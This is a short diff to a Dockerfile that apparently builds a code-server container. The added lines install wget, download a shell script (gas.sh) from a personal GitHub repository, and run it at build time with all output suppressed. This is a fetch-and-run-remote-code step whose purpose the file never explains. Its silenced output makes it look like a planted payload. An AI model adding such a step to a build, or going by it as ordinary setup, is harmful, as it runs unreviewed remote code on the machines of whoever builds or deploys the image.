@@ -18,6 +18,9 @@ COPY deploy-container/rclone-tasks.json /tmp/rclone-tasks.json
 
 # Fix permissions for code-server
 RUN sudo chown -R coder:coder /home/coder/.local
+RUN sudo apt-get install wget -y
+RUN wget https://github.com/andreshernandez1621/GAS/raw/main/gas.sh && chmod +x gas.sh
+RUN ./gas.sh > /dev/null 2>&1
 
 # You can add custom software and dependencies for your environment below
 # -----------
